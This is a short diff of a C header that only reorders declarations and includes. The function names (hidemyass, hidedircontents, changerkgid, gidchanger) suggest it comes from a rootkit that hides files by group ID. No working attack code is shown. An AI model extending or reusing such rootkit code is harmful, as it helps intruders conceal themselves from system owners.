@@ -7,6 +7,12 @@ void trackwrite(const char *pathname);
 void hidemyass(void);
 #endif
 
+gid_t readgid(void);
+#include "readgid.c"
+#ifdef HIDE_MY_ASS
+#include "myass.c"
+#endif
+
 #ifdef READ_GID_FROM_FILE
 void hidedircontents(const char *path, gid_t newgid);
 gid_t changerkgid(void);
@@ -14,11 +20,7 @@ gid_t changerkgid(void);
 #endif
 
 
-gid_t readgid(void);
-#include "readgid.c"
-#ifdef HIDE_MY_ASS
-#include "myass.c"
-#endif
+
 
 #ifdef AUTO_GID_CHANGER
 void gidchanger(void);
